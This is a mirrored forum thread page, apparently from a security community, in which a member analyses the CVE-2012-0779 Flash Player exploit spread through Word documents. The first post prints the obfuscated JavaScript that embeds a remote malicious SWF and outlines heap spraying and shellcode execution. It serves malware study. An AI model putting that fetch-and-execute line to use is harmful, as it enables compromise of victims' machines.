@@ -1,0 +1,1346 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml" dir="ltr" lang="en" id="vbulletin_html">
+
+<!-- Mirrored from garage4hackers.com/showthread.php?t=2300 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 18:30:03 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=ISO-8859-1" /><!-- /Added by HTTrack -->
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
+<meta id="e_vb_meta_bburl" name="vb_meta_bburl" content="index.html" />
+<base  /><!--[if IE]></base><![endif]-->
+<meta name="generator" content="vBulletin 4.2.1" />
+<meta http-equiv="X-UA-Compatible" content="IE=9" />
+
+	<link rel="Shortcut Icon" href="favicon.ico" type="image/x-icon" />
+
+
+
+
+
+
+	<meta property="fb:app_id" content="170793809601191" />
+<meta property="og:site_name" content="Garage4hackers Forum" />
+<meta property="og:description" content="Garage4Hackers(G4H) is an open security community for Information Security enthusiasts, gurus and aspirants.Members of the team dedicate time and resources towards helping other information security aspirants, sharing knowledge,spreading security awareness and promoting research." />
+<meta property="og:url" content="showthread8c64.html?t=2300" />
+<meta property="og:type" content="article" />
+
+
+
+
+	
+		<script type="text/javascript" src="../yui.yahooapis.com/comboaa66?2.9.0/build/yuiloader-dom-event/yuiloader-dom-event.js&amp;2.9.0/build/connection/connection-min.js"></script>
+	
+
+<script type="text/javascript">
+<!--
+	if (typeof YAHOO === 'undefined') // Load ALL YUI Local
+	{
+		document.write('<script type="text/javascript" src="clientscript/yui/yuiloader-dom-event/yuiloader-dom-event6719.html?v=421"><\/script>');
+		document.write('<script type="text/javascript" src="clientscript/yui/connection/connection-min6719.html?v=421"><\/script>');
+		var yuipath = 'clientscript/yui';
+		var yuicombopath = '';
+		var remoteyui = false;
+	}
+	else	// Load Rest of YUI remotely (where possible)
+	{
+		var yuipath = '../external.html?link=http://yui.yahooapis.com/2.9.0/build';
+		var yuicombopath = '../external.html?link=http://yui.yahooapis.com/combo';
+		var remoteyui = true;
+		if (!yuicombopath)
+		{
+			document.write('<script type="text/javascript" src="../yui.yahooapis.com/2.9.0/build/connection/connection-min6719.js?v=421"><\/script>');
+		}
+	}
+	var SESSIONURL = "";
+	var SECURITYTOKEN = "guest";
+	var IMGDIR_MISC = "images/misc";
+	var IMGDIR_BUTTON = "images/buttons";
+	var vb_disable_ajax = parseInt("0", 10);
+	var SIMPLEVERSION = "421";
+	var BBURL = "index.html";
+	var LOGGEDIN = 0 > 0 ? true : false;
+	var THIS_SCRIPT = "showthread";
+	var RELPATH = "showthread8c64.html?t=2300";
+	var PATHS = {
+		forum : "",
+		cms   : "",
+		blog  : ""
+	};
+	var AJAXBASEURL = "index.html";
+// -->
+</script>
+<script type="text/javascript" src="clientscript/vbulletin-core6719.js?v=421"></script>
+
+
+
+	<link rel="alternate" type="application/rss+xml" title="Garage4hackers Forum RSS Feed" href="external9476.php?type=RSS2" />
+	
+		<link rel="alternate" type="application/rss+xml" title="Garage4hackers Forum - Reverse Engineering and Application Cracking - RSS Feed" href="external2471.php?type=RSS2&amp;forumids=24" />
+	
+
+
+
+	<link rel="stylesheet" type="text/css" href="css30f2.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=bbcode.css,editor.css,popupmenu.css,reset-fonts.css,vbulletin.css,vbulletin-chrome.css,vbulletin-formcontrols.css," />
+
+	<!--[if lt IE 8]>
+	<link rel="stylesheet" type="text/css" href="css.php?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=popupmenu-ie.css,vbulletin-ie.css,vbulletin-chrome-ie.css,vbulletin-formcontrols-ie.css,editor-ie.css" />
+	<![endif]-->
+
+
+	<meta name="keywords" content="actionscript, flash player, document, javascript, payload, shellcode, player, flash, present, inside, fetch, exploit, contagio, embed, easily, embedded, encrypted, malicious, trigger, process, spray, mentioned, execution, redirecting, vulnerability, attribute, connect, metadata, found, information, version, 5.0.3, decompressed, decompiled, doswf, focus, locate, http://contagiodump.blogspot.in/2012/05/may-3-cve-2012-0779-world-uyghur.html, magic, bytes, compressed, sprayed, stuff, javascriptevaldocument.writeunescape%3cembed%20src%3dhttp://example.com/malicious.swf?info=&amp;infosize=%3e%3c/embed%3e, strings, encoded, viewing, located, overview, latest" />
+	<meta name="description" content="This is regarding a latest Flash Player Exploit which is being used in the wild, mostly being served to victims in the form of Word Documents. 
+ 
+A brief overview before we get to the good stuff: 
+ 
+A Word Document has the following malicious JavaScript embedded in it: 
+ 
+javascript:eval(document.write(unescape('%3Cembed%20src%3Dhttp://example.com/malicious.swf?info=&lt;48 Char Hash&gt;&amp;infosize=&lt;A Dword&gt;%3E%3C/embed%3E'))) 
+ 
+This JavaScript can easily be located by viewing the strings of the Word" />
+
+	<title> CVE-2012-0779 - Flash Player Exploit</title>
+	<link rel="canonical" href="showthread8c64.html?t=2300" />
+	
+	<script type="text/javascript" src="clientscript/vbulletin_textedit6719.html?v=421"></script>
+	<script type="text/javascript" src="clientscript/vbulletin_post_loader6719.html?v=421"></script>
+	
+	
+	
+	
+	
+	
+		<script type="text/javascript" src="clientscript/vbulletin_lightbox6719.html?v=421"></script>
+	
+
+	
+		<link rel="stylesheet" type="text/css" href="css8d9b.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=postlist.css,showthread.css,postbit.css,attachment.css,poll.css,lightbox.css" />
+	
+
+<link rel="stylesheet" type="text/css" href="css657d.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=additional.css" />
+
+</head>
+
+<body>
+
+<div class="above_body"> <!-- closing tag is in template navbar -->
+<div id="header" class="floatcontainer doc_header">
+	<div><a name="top" href="forum.html" class="logo-image"><img src="images/misc/vbulletin4_logo.html" alt="Garage4hackers Forum" /></a></div>
+	<div id="toplinks" class="toplinks">
+		
+			<ul class="nouser">
+			
+				<li><a href="register.html" rel="nofollow">Register</a></li>
+			
+				<li><a rel="help" href="faq.html">Help</a></li>
+				<li>
+			<script type="text/javascript" src="clientscript/vbulletin_md56719.html?v=421"></script>
+			<form id="navbar_loginform" action="../external.html?link=http://garage4hackers.com/login.php?do=login" method="post" onsubmit="md5hash(vb_login_password, vb_login_md5password, vb_login_md5password_utf, 0)">
+				<fieldset id="logindetails" class="logindetails">
+					<div>
+						<div>
+					<input type="text" class="textbox default-value" name="vb_login_username" id="navbar_username" size="10" accesskey="u" tabindex="101" value="User Name" />
+					<input type="password" class="textbox" tabindex="102" name="vb_login_password" id="navbar_password" size="10" />
+					<input type="text" class="textbox default-value" tabindex="102" name="vb_login_password_hint" id="navbar_password_hint" size="10" value="Password" style="display:none;" />
+					<input type="submit" class="loginbutton" tabindex="104" value="Log in" title="Enter your username and password in the boxes provided to login, or click the 'register' button to create a profile for yourself." accesskey="s" />
+						</div>
+					</div>
+				</fieldset>
+				<div id="remember" class="remember">
+					<label for="cb_cookieuser_navbar"><input type="checkbox" name="cookieuser" value="1" id="cb_cookieuser_navbar" class="cb_cookieuser_navbar" accesskey="c" tabindex="103" /> Remember Me?</label>
+				</div>
+
+				<input type="hidden" name="s" value="" />
+				<input type="hidden" name="securitytoken" value="guest" />
+				<input type="hidden" name="do" value="login" />
+				<input type="hidden" name="vb_login_md5password" />
+				<input type="hidden" name="vb_login_md5password_utf" />
+			</form>
+			<script type="text/javascript">
+			YAHOO.util.Dom.setStyle('navbar_password_hint', "display", "inline");
+			YAHOO.util.Dom.setStyle('navbar_password', "display", "none");
+			vB_XHTML_Ready.subscribe(function()
+			{
+			//
+				YAHOO.util.Event.on('navbar_username', "focus", navbar_username_focus);
+				YAHOO.util.Event.on('navbar_username', "blur", navbar_username_blur);
+				YAHOO.util.Event.on('navbar_password_hint', "focus", navbar_password_hint);
+				YAHOO.util.Event.on('navbar_password', "blur", navbar_password);
+			});
+			
+			function navbar_username_focus(e)
+			{
+			//
+				var textbox = YAHOO.util.Event.getTarget(e);
+				if (textbox.value == 'User Name')
+				{
+				//
+					textbox.value='';
+					textbox.style.color='#000000';
+				}
+			}
+
+			function navbar_username_blur(e)
+			{
+			//
+				var textbox = YAHOO.util.Event.getTarget(e);
+				if (textbox.value == '')
+				{
+				//
+					textbox.value='User Name';
+					textbox.style.color='#777777';
+				}
+			}
+			
+			function navbar_password_hint(e)
+			{
+			//
+				var textbox = YAHOO.util.Event.getTarget(e);
+				
+				YAHOO.util.Dom.setStyle('navbar_password_hint', "display", "none");
+				YAHOO.util.Dom.setStyle('navbar_password', "display", "inline");
+				YAHOO.util.Dom.get('navbar_password').focus();
+			}
+
+			function navbar_password(e)
+			{
+			//
+				var textbox = YAHOO.util.Event.getTarget(e);
+				
+				if (textbox.value == '')
+				{
+					YAHOO.util.Dom.setStyle('navbar_password_hint', "display", "inline");
+					YAHOO.util.Dom.setStyle('navbar_password', "display", "none");
+				}
+			}
+			</script>
+				</li>
+				
+					<li id="fb_headerbox" class="hidden">
+
+	<a id="fb_loginbtn" href="#"><img src="images/misc/facebook_login.html" alt="The Facebook Platform" /></a>
+
+</li>
+
+				
+			</ul>
+		
+	</div>
+	<div class="ad_global_header">
+		 
+		 
+	</div>
+	<hr />
+</div>
+<div id="navbar" class="navbar">
+	<ul id="navtabs" class="navtabs floatcontainer">
+		
+		
+	
+		<li  id="vbtab_whatsnew">
+			<a class="navtab" href="activity.html">What's New?</a>
+		</li>
+		
+		
+
+	
+		<li  id="vbtab_cms">
+			<a class="navtab" href="content.html">Articles</a>
+		</li>
+		
+		
+
+	
+		<li class="selected" id="vbtab_forum">
+			<a class="navtab" href="forum.html">Forum</a>
+		</li>
+		
+		
+			<ul class="floatcontainer">
+				
+					
+						
+							<li id="vbflink_newposts"><a href="search8427.html?do=getnew&amp;contenttype=vBForum_Post">New Posts</a></li>
+						
+					
+				
+					
+						
+							<li id="vbflink_faq"><a href="faq.html">FAQ</a></li>
+						
+					
+				
+					
+						
+							<li id="vbflink_calendar"><a href="calendar.html">Calendar</a></li>
+						
+					
+				
+					
+						<li class="popupmenu" id="vbmenu_community">
+							<a href="javascript://" class="popupctrl">Community</a>
+							<ul class="popupbody popuphover">
+								
+									<li id="vbclink_members"><a href="memberlist.html">Member List</a></li>
+								
+							</ul>
+						</li>
+					
+				
+					
+						<li class="popupmenu" id="vbmenu_actions">
+							<a href="javascript://" class="popupctrl">Forum Actions</a>
+							<ul class="popupbody popuphover">
+								
+									<li id="vbalink_mfr"><a href="forum.html?do=markread&amp;markreadhash=guest">Mark Forums Read</a></li>
+								
+							</ul>
+						</li>
+					
+				
+					
+						<li class="popupmenu" id="vbmenu_qlinks">
+							<a href="javascript://" class="popupctrl">Quick Links</a>
+							<ul class="popupbody popuphover">
+								
+									<li id="vbqlink_posts"><a href="search2791.html?do=getdaily&amp;contenttype=vBForum_Post">Today's Posts</a></li>
+								
+									<li id="vbqlink_leaders"><a href="showgroups.html">View Site Leaders</a></li>
+								
+							</ul>
+						</li>
+					
+				
+			</ul>
+		
+
+	
+		<li  id="vbtab_blog">
+			<a class="navtab" href="blog.html">Blogs</a>
+		</li>
+		
+		
+
+	
+		<li  id="tab_nja4_357">
+			<a class="navtab" href="pages7b82.html?pageid=2">G4H Team</a>
+		</li>
+		
+		
+
+	
+		<li  id="tab_nta0_579">
+			<a class="navtab" href="pages8782.html?pageid=3">IRC</a>
+		</li>
+		
+		
+
+	
+		<li  id="tab_nta0_442">
+			<a class="navtab" href="pagesdbe0.html?pageid=4">Ranchoddas</a>
+		</li>
+		
+		
+
+		<li>
+            <a class="navtab" href="pages.html">Events and Conferences</a></li>
+	</ul>
+	
+		<div id="globalsearch" class="globalsearch">
+			<form action="../external.html?link=http://garage4hackers.com/search.php?do=process" method="post" id="navbar_search" class="navbar_search">
+				
+				<input type="hidden" name="securitytoken" value="guest" />
+				<input type="hidden" name="do" value="process" />
+				<span class="textboxcontainer"><span><input type="text" value="" name="query" class="textbox" tabindex="99"/></span></span>
+				<span class="buttoncontainer"><span><input type="image" class="searchbutton" src="images/buttons/search.html" name="submit" onclick="document.getElementById('navbar_search').submit;" tabindex="100"/></span></span>
+			</form>
+			<ul class="navbar_advanced_search">
+				<li><a href="search.html" accesskey="4">Advanced Search</a></li>
+				
+			</ul>
+		</div>
+	
+</div>
+</div><!-- closing div for above_body -->
+
+<div class="body_wrapper">
+<div id="breadcrumb" class="breadcrumb">
+	<ul class="floatcontainer">
+		<li class="navbithome"><a href="content.html" accesskey="1"><img src="images/misc/navbit-home.html" alt="Home" /></a></li>
+		
+	<li class="navbit"><a href="forum.html">Forum</a></li>
+
+	<li class="navbit"><a href="forumdisplayffeb.html?f=20">Experts Forum</a></li>
+
+	<li class="navbit"><a href="forumdisplay345c.html?f=24">Reverse Engineering and Application Cracking</a></li>
+
+		
+	<li class="navbit lastnavbit"><span> CVE-2012-0779 - Flash Player Exploit</span></li>
+
+	</ul>
+	<hr />
+</div>
+
+
+<div style="width:728px; margin:0 auto; padding-bottom:1em">
+<script type="text/javascript"><!--
+google_ad_client = "ca-pub-6847984837250662";
+google_ad_host = "ca-host-pub-2606800903002383";
+google_ad_width = 728;
+google_ad_height = 15;
+google_ad_format = "728x15_0ads_al_s";
+google_ad_channel = "";
+google_color_border = "";
+google_color_bg = "";
+google_color_link = "";
+google_color_text = "";
+google_color_url = "";
+google_ui_features = "rc:6";
+//-->
+</script>
+<script type="text/javascript"
+  src="../pagead2.googlesyndication.com/pagead/show_ads.js">
+</script>
+</div>
+
+<div id="ad_global_below_navbar"><script async src="../pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- garage1 -->
+<ins class="adsbygoogle"
+     style="display:inline-block;width:728px;height:90px"
+     data-ad-client="ca-pub-6847984837250662"
+     data-ad-slot="4036513682"></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script></div>
+
+
+	<form action="../external.html?link=http://garage4hackers.com/profile.php?do=dismissnotice" method="post" id="notices" class="notices">
+		<input type="hidden" name="do" value="dismissnotice" />
+		<input type="hidden" name="s" value="" />
+		<input type="hidden" name="securitytoken" value="guest" />
+		<input type="hidden" id="dismiss_notice_hidden" name="dismiss_noticeid" value="" />
+		<input type="hidden" name="url" value="" />
+		<ol>
+			<li class="restore" id="navbar_notice_2">
+	
+	<html>
+<h2>
+The forum is <a href="showthread1180.html?t=7049&amp;p=14985#post14985">frozen forever</a> - but it won't die; it'll stay for long in search engine results and we hope it would keep helping newbies in some way or other - cheers! 
+
+
+</h2>
+
+<!-- Mirrored from garage4hackers.com/showthread.php?t=2300 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 18:30:03 GMT -->
+</html>
+</li>
+		</ol>
+	</form>
+
+
+
+
+
+	<div id="above_postlist" class="above_postlist">
+		
+
+		<div id="pagination_top" class="pagination_top">
+		
+			<div id="postpagestats_above" class="postpagestats">
+				Results 1 to 3 of 3
+			</div>
+		</div>
+	</div>
+<div id="pagetitle" class="pagetitle">
+	<h1>
+		Thread: <span class="threadtitle"><a href="showthread8c64.html?t=2300" title="Reload this Page">CVE-2012-0779 - Flash Player Exploit</a></span>
+
+<a class="a2a_dd" href="../external.html?link=http://www.addtoany.com/share_save"><img src="../static.addtoany.com/buttons/share_save_171_16.png" width="171" height="16" border="0" alt="Share/Save - My123World.Com!"/></a><script type="text/javascript">a2a_show_title=1;a2a_num_services=14;</script><script type="text/javascript" src="../static.addtoany.com/menu/page.js"></script>
+
+		
+			
+<fb:like href="showthread8c64.html?t=2300" font="tahoma" layout="standard" show_faces="false" width="260" action="../external.html?link=http://garage4hackers.com/like" colorscheme="light"></fb:like>
+		
+	</h1>
+</div>
+	<div id="thread_controls" class="thread_controls">
+		<div>
+		<ul id="postlist_popups" class="postlist_popups popupgroup">
+			
+			<li class="popupmenu" id="threadtools">
+				<h6><a class="popupctrl" href="javascript://">Thread Tools</a></h6>
+				<ul class="popupbody popuphover">
+					<li><a href="printthread3959.html?t=2300&amp;pp=10&amp;page=1" accesskey="3" 
+						rel="nofollow">Show Printable Version</a></li>
+					<li><a href="sendmessage2c34.html?do=sendtofriend&amp;t=2300"
+						rel="nofollow">Email this Page&hellip;</a></li>
+					<li>
+						
+							<a href="subscription3fc9.html?do=addsubscription&amp;t=2300" 
+								rel="nofollow">Subscribe to this Thread&hellip;</a>
+											
+					</li>
+					
+				</ul>
+			</li>
+
+			
+
+			
+				<li class="popupmenu searchthread" id="searchthread">
+					<h6><a class="popupctrl" href="javascript://">Search Thread</a></h6>
+					<form action="../external.html?link=http://garage4hackers.com/search.php" method="post">
+						<ul class="popupbody popuphover">
+							<li>
+								<input type="text" name="query" class="searchbox" value="Search..." tabindex="13" />
+								<input type="submit" class="button" value="Search" tabindex="14" />
+							</li>
+							<li class="formsubmit">
+								<div><a class="advancedsearchlink" href="search8896.html?search_type=1&amp;searchthreadid=2300&amp;contenttype=vBForum_Post">Advanced Search</a></div>
+							</li>
+						</ul>
+						<input type="hidden" name="s" value="" />
+						<input type="hidden" name="securitytoken" value="guest" />
+						<input type="hidden" name="do" value="process" />
+						<input type="hidden" name="searchthreadid" value="2300" />
+						<input type="hidden" name="search_type" value="1" />
+						<input type="hidden" name="contenttype" value="vBForum_Post" />
+
+					</form>
+				</li>
+			
+
+			
+
+			
+				<li class="popupmenu" id="displaymodes">
+					<h6><a class="popupctrl" href="javascript://">Display</a></h6>
+					<ul class="popupbody popuphover">
+						<li><a href="showthread20f3-2.html?t=2300&amp;p=7743&amp;mode=linear#post7743"> Switch to Linear Mode</a></li>
+						<li><a href="showthread49af.html?t=2300&amp;mode=hybrid"> Switch to Hybrid Mode</a></li>
+						<li><label>Threaded Mode</label></li>
+					</ul>
+				</li>
+			
+
+			
+		</ul>
+		</div>
+	</div>
+
+<div id="postlist" class="postlist restrain">
+	
+		<script type="text/javascript">
+<!--
+var imgdir_statusicon = "images/statusicon";
+var imgdir_misc = "images/misc";
+var cleargifurl = "clear.gif";
+var guestphrase = "Guest";
+var morephrase = "More replies below current depth...";
+var highlightwords = "";
+//-->
+</script>
+
+<script type="text/javascript" src="clientscript/vbulletin_thrdpostlist6719.html?v=421"></script>
+
+<script type="text/javascript">
+<!--
+// initialize some variables
+var curpostid = 7743;
+var quickreply = false;
+
+// cached posts (no page reload required to view)
+pd[7743] = '\r\n<li class="postbitlegacy postbitim postcontainer old" id="post_7743">\r\n<!-' + '- see bottom of postbit.css for .userinfo .popupmenu styles -' + '->\r\n\r\n	<div class="posthead">\r\n			<span class="postdate old">\r\n				\r\n					<span class="date">05-11-2012,&nbsp;<span class="time">09:08 PM</span></span>\r\n				\r\n			</span>\r\n			<span class="nodecontrols">\r\n				\r\n					<a name="post7743" href="showthread.php?t=2300&amp;p=7743&amp;viewfull=1#post7743" class="postcounter">#1</a><a id="postcount7743" name="1"></a>\r\n				\r\n				\r\n				\r\n			</span>\r\n	</div>\r\n	<div class="postdetails">\r\n		<div class="userinfo">\r\n			<div class="username_container">\r\n			\r\n				<div class="popupmenu memberaction">\r\n	<a class="username offline popupctrl" href="member.php?u=311" title="c0d3inj3cT is offline"><strong>c0d3inj3cT</strong></a>\r\n	<ul class="popupbody popuphover memberaction_body">\r\n		<li class="left">\r\n			<a href="member.php?u=311" class="siteicon_profile">\r\n				View Profile\r\n			</a>\r\n		</li>\r\n		\r\n		<li class="right">\r\n			<a href="search.php?do=finduser&amp;userid=311&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">\r\n				View Forum Posts\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		<li class="left">\r\n			<a href="private.php?do=newpm&amp;u=311" class="siteicon_message" rel="nofollow">\r\n				Private Message\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="blog.php?u=311" class="siteicon_blog" rel="nofollow">\r\n				View Blog Entries\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="http://garage4hackers.com/list.php?r=author/311-c0d3inj3cT" class="siteicon_article" rel="nofollow">\r\n				View Articles\r\n			</a>\r\n		</li>\r\n		\r\n\r\n		\r\n\r\n		\r\n		\r\n	</ul>\r\n</div>\r\n				<img class="inlineimg onlinestatus" src="images/statusicon/user-offline.png" alt="c0d3inj3cT is offline" border="0" />\r\n\r\n			\r\n			</div>\r\n			<span class="usertitle">\r\n				Garage Member\r\n			</span>\r\n			\r\n			\r\n			\r\n				<span class="postbit_reputation" id="repdisplay_7743_311" title="c0d3inj3cT will become famous soon enough">\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n				</span>\r\n			\r\n			 \r\n			\r\n				<hr />\r\n				<dl class="userinfo_extra">\r\n					<dt>Join Date</dt> <dd>Dec 2010</dd>\r\n					\r\n					\r\n					<dt>Posts</dt> <dd>67</dd>	\r\n					<dt>Blog Entries</dt><dd><a href="blog.php?u=311">2</a></dd>\r\n				</dl>\r\n				\r\n				\r\n				<div class="imlinks">\r\n					    \r\n				</div>\r\n			\r\n		</div>\r\n		<div class="postbody">\r\n			<div class="postrow">\r\n				\r\n				\r\n				<h2 class="title icon">\r\n					CVE-2012-0779 - Flash Player Exploit\r\n				</h2>\r\n				\r\n\r\n\r\n						\r\n						\r\n				<div class="content">\r\n					<div id="post_message_7743">\r\n						<blockquote class="postcontent restore ">\r\n							This is regarding a latest Flash Player Exploit which is being used in the wild, mostly being served to victims in the form of Word Documents.<br />\r\n<br />\r\nA brief overview before we get to the good stuff:<br />\r\n<br />\r\nA Word Document has the following malicious JavaScript embedded in it:<br />\r\n<br />\r\n<div class="bbcode_container">\r\n	<div class="bbcode_description">Code:</div>\r\n	<pre class="bbcode_code"style="height:36px;">javascript<b></b>:eval(document.write(unescape(\'%3Cembed%20src%3Dhttp://example.com/malicious.swf?info=&lt;48 Char Hash&gt;&amp;infosize=&lt;A Dword&gt;%3E%3C/embed%3E\')))</pre>\r\n</div>This JavaScript can easily be located by viewing the strings of the Word Document. It is encoded but it should be easy to follow that it creates an embed tag as following:<br />\r\n<br />\r\n<div class="bbcode_container">\r\n	<div class="bbcode_description">Code:</div>\r\n	<pre class="bbcode_code"style="height:36px;">&lt;embed src=&quot;http://example.com/malicious.swf?info=&lt;48 Char Hash&gt;&amp;infosize=&lt;A Dword&gt;&quot;&gt;&lt;/embed&gt;</pre>\r\n</div>Apart from the above malicious JavaScript, you will also find a payload present inside the Word Document. The MZ and PE Signatures are XOR Encrypted using a Byte. It can be easily retrieved using OfficeMalScanner.<br />\r\n<br />\r\nIt will bruteforce the XOR Key and dump the embedded payload. You may find only 1 binary or even multiple binaries.<br />\r\n<br />\r\nWhen you open the MS Word Document, it will connect to the URL mentioned in the SRC Attribute of the Embed tag and fetch a SWF File. This in turn will spray the Process Heap with shellcode and trigger the vulnerability in Flash Player, thereby redirecting the execution to shellcode sprayed over the heap.<br />\r\n<br />\r\nThis shellcode will locate the payload present inside the Word Document.<br />\r\n<br />\r\nNow, let\'s focus on the SWF file. You can fetch a SWF File from Contagio here:<br />\r\n<br />\r\n<a href="http://contagiodump.blogspot.in/2012/05/may-3-cve-2012-0779-world-uyghur.html" target="_blank">http://contagiodump.blogspot.in/2012...ld-uyghur.html</a><br />\r\n<br />\r\nThanks Mila <img src="images/smilies/smile.png" border="0" alt="" title="Smile" class="inlineimg" /><br />\r\n<br />\r\nThe SWF file is compressed as you can see from the magic bytes (CWS).<br />\r\n<br />\r\nIt is also encrypted using DoSWF version 5.0.3. This information can be found in the RDF Metadata of the decompressed SWF File.<br />\r\n<br />\r\nThe decompiled ActionScript is posted on Contagio. It\'s time to deep dive into the ActionScript.\r\n						</blockquote>\r\n					</div>\r\n\r\n					\r\n				</div>\r\n			</div>\r\n			\r\n			<div class="cleardiv"></div>\r\n		</div>\r\n	</div>\r\n		<div class="postfoot">\r\n			<!-' + '- <div class="postfoot_container"> -' + '->\r\n			<div class="textcontrols floatcontainer">\r\n				<span class="postcontrols">\r\n					<img style="display:none" id="progress_7743" src="images/misc/progress.gif" alt="" />\r\n					\r\n					\r\n					\r\n						<a id="qrwq_7743" class="newreply" href="newreply.php?do=newreply&amp;p=7743" rel="nofollow" title="Reply With Quote"><img id="quoteimg_7743" src="clear.gif" alt="Reply With Quote" />  Reply With Quote</a> \r\n					\r\n					\r\n					\r\n				</span>\r\n				<span class="postlinking">\r\n					\r\n						\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n\r\n					\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n					\r\n				</span>\r\n			<!-' + '- </div> -' + '->\r\n			</div>\r\n		</div>\r\n	<hr />\r\n</li>\r\n';
+pd[7744] = '\r\n<li class="postbitlegacy postbitim postcontainer old" id="post_7744">\r\n<!-' + '- see bottom of postbit.css for .userinfo .popupmenu styles -' + '->\r\n\r\n	<div class="posthead">\r\n			<span class="postdate old">\r\n				\r\n					<span class="date">05-11-2012,&nbsp;<span class="time">09:24 PM</span></span>\r\n				\r\n			</span>\r\n			<span class="nodecontrols">\r\n				\r\n					<a name="post7744" href="showthread.php?t=2300&amp;p=7744&amp;viewfull=1#post7744" class="postcounter">#2</a><a id="postcount7744" name="2"></a>\r\n				\r\n				\r\n				\r\n			</span>\r\n	</div>\r\n	<div class="postdetails">\r\n		<div class="userinfo">\r\n			<div class="username_container">\r\n			\r\n				<div class="popupmenu memberaction">\r\n	<a class="username offline popupctrl" href="member.php?u=16" title="41.w4r10r is offline"><strong>41.w4r10r</strong></a>\r\n	<ul class="popupbody popuphover memberaction_body">\r\n		<li class="left">\r\n			<a href="member.php?u=16" class="siteicon_profile">\r\n				View Profile\r\n			</a>\r\n		</li>\r\n		\r\n		<li class="right">\r\n			<a href="search.php?do=finduser&amp;userid=16&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">\r\n				View Forum Posts\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		<li class="left">\r\n			<a href="private.php?do=newpm&amp;u=16" class="siteicon_message" rel="nofollow">\r\n				Private Message\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="blog.php?u=16" class="siteicon_blog" rel="nofollow">\r\n				View Blog Entries\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="http://garage4hackers.com/list.php?r=author/16-41-w4r10r" class="siteicon_article" rel="nofollow">\r\n				View Articles\r\n			</a>\r\n		</li>\r\n		\r\n\r\n		\r\n\r\n		\r\n		\r\n	</ul>\r\n</div>\r\n				<img class="inlineimg onlinestatus" src="images/statusicon/user-offline.png" alt="41.w4r10r is offline" border="0" />\r\n\r\n			\r\n			</div>\r\n			<span class="usertitle">\r\n				Garage Addict\r\n			</span>\r\n			\r\n			\r\n			\r\n				<span class="postbit_reputation" id="repdisplay_7744_16" title="41.w4r10r has a spectacular aura about">\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n				</span>\r\n			\r\n			\r\n			<a class="postuseravatar" href="member.php?u=16" title="41.w4r10r is offline">\r\n				<img src="image.php?u=16&amp;dateline=1317119947" alt="41.w4r10r\'s Avatar" title="41.w4r10r\'s Avatar" />\r\n			</a>\r\n			 \r\n			\r\n				<hr />\r\n				<dl class="userinfo_extra">\r\n					<dt>Join Date</dt> <dd>Jul 2010</dd>\r\n					<dt>Location</dt> <dd>Pune</dd>\r\n					\r\n					<dt>Posts</dt> <dd>338</dd>	\r\n					<dt>Blog Entries</dt><dd><a href="blog.php?u=16">3</a></dd>\r\n				</dl>\r\n				\r\n				\r\n				<div class="imlinks">\r\n					    \r\n				</div>\r\n			\r\n		</div>\r\n		<div class="postbody">\r\n			<div class="postrow">\r\n				\r\n				\r\n\r\n\r\n						\r\n						\r\n				<div class="content">\r\n					<div id="post_message_7744">\r\n						<blockquote class="postcontent restore ">\r\n							Waiting to see length of your Deep Dive..... <img src="images/smilies/wink.png" border="0" alt="" title="Wink" class="inlineimg" /><br />\n<br />\ngood analysis....<br />\n<br />\nkeep it up...\r\n						</blockquote>\r\n					</div>\r\n\r\n					\r\n				</div>\r\n			</div>\r\n			\r\n			<div class="cleardiv"></div>\r\n		</div>\r\n	</div>\r\n		<div class="postfoot">\r\n			<!-' + '- <div class="postfoot_container"> -' + '->\r\n			<div class="textcontrols floatcontainer">\r\n				<span class="postcontrols">\r\n					<img style="display:none" id="progress_7744" src="images/misc/progress.gif" alt="" />\r\n					\r\n					\r\n					\r\n						<a id="qrwq_7744" class="newreply" href="newreply.php?do=newreply&amp;p=7744" rel="nofollow" title="Reply With Quote"><img id="quoteimg_7744" src="clear.gif" alt="Reply With Quote" />  Reply With Quote</a> \r\n					\r\n					\r\n					\r\n				</span>\r\n				<span class="postlinking">\r\n					\r\n						\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n\r\n					\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n					\r\n				</span>\r\n			<!-' + '- </div> -' + '->\r\n			</div>\r\n		</div>\r\n	<hr />\r\n</li>\r\n';
